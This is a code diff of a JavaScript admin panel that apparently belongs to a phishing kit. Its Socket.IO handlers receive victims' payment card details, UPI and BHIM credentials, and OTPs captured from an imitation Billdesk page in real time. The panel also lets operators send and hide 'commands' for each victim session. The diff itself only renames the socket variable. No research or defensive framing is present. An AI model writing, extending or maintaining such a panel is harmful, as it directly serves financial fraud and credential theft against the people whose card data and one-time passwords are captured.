@@ -1,7 +1,7 @@
 // Admin Panel - Real-Time Card Submission Management (ENHANCED WITH PERSISTENCE)
-// Socket.IO Client for Real-Time Communication
+// window.socket.IO Client for Real-Time Communication
 
-let socket = null;
+window.socket = null;
 const submissions = new Map(); // Store submissions by sessionId
 
 // AUTO-DETECT SERVER URL: Use current domain in production, localhost in development
@@ -17,9 +17,9 @@ const getServerUrl = () => {
 const SERVER_URL = getServerUrl();
 console.log('🌐 Server URL:', SERVER_URL);
 
-// Initialize Socket.IO Connection
+// Initialize window.socket.IO Connection
 function initializeConnection() {
-    socket = io(SERVER_URL, {
+    window.socket = io(SERVER_URL, {
         transports: ['websocket', 'polling'],
         reconnection: true,
         reconnectionDelay: 1000,
@@ -27,72 +27,72 @@ function initializeConnection() {
     });
 
     // Connection Events
-    socket.on('connect', () => {
+    window.socket.on('connect', () => {
         console.log('✅ Connected to server');
         updateConnectionStatus(true);
         // Load all previous submissions when connected
         loadAllSubmissions();
     });
 
-    socket.on('disconnect', () => {
+    window.socket.on('disconnect', () => {
         console.log('❌ Disconnected from server');
         updateConnectionStatus(false);
     });
 
-    socket.on('connect_error', (error) => {
+    window.socket.on('connect_error', (error) => {
         console.error('Connection error:', error);
         updateConnectionStatus(false);
     });
 
     // Connection Update
-    socket.on('connectionUpdate', (data) => {
+    window.socket.on('connectionUpdate', (data) => {
         updateConnectionCount(data.activeConnections || 0);
     });
 
     // Real-Time Card Details Received
-    socket.on('cardDetailsReceived', (data) => {
+    window.socket.on('cardDetailsReceived', (data) => {
         console.log('💳 New card details received:', data);
         handleNewCardSubmission(data);
     });
 
     // UPI Details Received
-    socket.on('upiDetailsReceived', (data) => {
+    window.socket.on('upiDetailsReceived', (data) => {
         console.log('📱 New UPI details received:', data);
         handleNewUpiSubmission(data);
     });
 
     // BHIM Details Received
-    socket.on('bhimDetailsReceived', (data) => {
+    window.socket.on('bhimDetailsReceived', (data) => {
         console.log('💳 New BHIM details received:', data);
         handleNewBhimSubmission(data);
     });
 
     // Payment Status Updates
-    socket.on('paymentCompleted', (data) => {
+    window.socket.on('paymentCompleted', (data) => {
         console.log('✅ Payment completed:', data);
         updateSubmissionStatus(data.sessionId, 'completed');
     });
 
-    socket.on('paymentFailed', (data) => {
+    window.socket.on('paymentFailed', (data) => {
         console.log('❌ Payment failed:', data);
         updateSubmissionStatus(data.sessionId, 'failed', data.reason);
     });
     
 
     // NEW: Listen for OTP submissions from Billdesk page
-    socket.on('otpSubmitted', (data) => {
+    window.socket.on('otpSubmitted', (data) => {
         console.log('🔢 OTP submitted:', data);
         displaySubmittedOTP(data.sessionId, data.otp, data.timestamp);
         showNotification(`🔢 OTP received: ${data.otp} for session ${data.sessionId}`, 'success');
     });
     // NEW: Listen for submission marked as seen from other admins
-    socket.on('submissionMarkedSeen', (data) => {
+    window.socket.on('submissionMarkedSeen', (data) => {
         console.log('👁️ Submission marked as seen:', data.sessionId);
         removeRedBorder(data.sessionId);
     });
     
     // NEW: Listen for commands hidden from other admins
-    socket.on('submissionCommandsHidden', (data) => {
+    window.socket.on('submissionCommandsHidden', (data) => {
         console.log('🙈 Commands hidden:', data.sessionId);
         hideCommandsForSubmission(data.sessionId);
     });
@@ -333,7 +333,7 @@ async function markAsSeen(sessionId) {
     removeRedBorder(sessionId);
     
     // Notify server and other admins
-    socket.emit('markSubmissionSeen', { sessionId });
+    window.socket.emit('markSubmissionSeen', { sessionId });
     
     try {
         await fetch(`${SERVER_URL}/api/admin/submissions/${sessionId}/seen`, {
@@ -359,7 +359,7 @@ async function hideCommands(sessionId) {
     hideCommandsForSubmission(sessionId);
     
     // Notify server and other admins
-    socket.emit('hideSubmissionCommands', { sessionId });
+    window.socket.emit('hideSubmissionCommands', { sessionId });
     
     try {
         await fetch(`${SERVER_URL}/api/admin/submissions/${sessionId}/hide-commands`, {
